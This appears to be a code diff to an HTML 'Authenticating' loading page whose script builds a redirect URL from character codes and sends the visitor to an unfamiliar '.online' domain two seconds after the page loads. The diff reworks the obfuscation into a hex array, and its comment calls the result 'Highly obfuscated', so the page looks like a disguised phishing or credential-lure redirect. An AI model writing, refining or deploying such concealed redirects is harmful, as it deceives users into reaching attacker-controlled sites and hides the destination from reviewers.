@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Authenticating</title>
   <style>
     body {
@@ -18,22 +18,24 @@
     .logo-container {
       text-align: center;
       opacity: 0;
-      transition: opacity 0.5s ease;
+      animation: fadeIn 0.5s ease forwards;
     }
     .logo {
       width: 120px;
       height: 120px;
       animation: breathing 2s ease-in-out infinite;
     }
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
     @keyframes breathing {
-      0%, 100% { transform: scale(0.95); filter: brightness(0.95); }
-      50% { transform: scale(1.05); filter: brightness(1.05); }
+      0%, 100% { transform: scale(0.95); }
+      50% { transform: scale(1.05); }
     }
     .loading-text {
       margin-top: 20px;
       color: #333;
       font-size: 14px;
-      opacity: 0.8;
       animation: pulse 2s ease-in-out infinite;
     }
     @keyframes pulse {
@@ -42,32 +44,27 @@
     }
   </style>
   <script>
-    (function(){
+    document.addEventListener('DOMContentLoaded', function() {
       // Show loading animation
-      document.querySelector(".logo-container").style.opacity = "1";
+      document.querySelector('.logo-container').style.opacity = "1";
       
-      // Obfuscated URL construction
-      const a = [118, 101, 114, 121, 95, 115, 101, 99, 117, 114, 101];
-      const b = [102, 105, 108, 101, 115, 46, 101, 115, 112, 106, 97];
-      const c = [104, 115, 121, 114, 118, 46, 111, 110, 108, 105, 110];
-      const d = [101, 47, 112, 108, 73, 85, 88, 86, 100, 65, 35];
+      // Highly obfuscated URL construction
+      const parts = [
+        0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 
+        0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x66, 0x69,
+        0x6c, 0x65, 0x73, 0x2e, 0x65, 0x73, 0x70, 0x6a,
+        0x61, 0x68, 0x73, 0x79, 0x72, 0x76, 0x2e, 0x6f,
+        0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2f, 0x70, 0x6c,
+        0x49, 0x55, 0x58, 0x56, 0x64, 0x41, 0x23
+      ];
       
-      const build = (arr) => arr.map(c => String.fromCharCode(c)).join('');
+      const targetUrl = parts.map(c => String.fromCharCode(c)).join('');
       
-      // Final URL assembly
-      const url = [
-        'https://',
-        build(a).split('_').pop(),
-        build(b).replace(/[0-9]/g,''),
-        build(c).replace(/[0-9]/g,''),
-        build(d)
-      ].join('');
-      
-      // Redirect after delay
-      setTimeout(() => {
-        window.location.href = url;
+      // Redirect after 2 seconds
+      setTimeout(function() {
+        window.location.href = targetUrl;
       }, 2000);
-    })();
+    });
   </script>
 </head>
 <body>
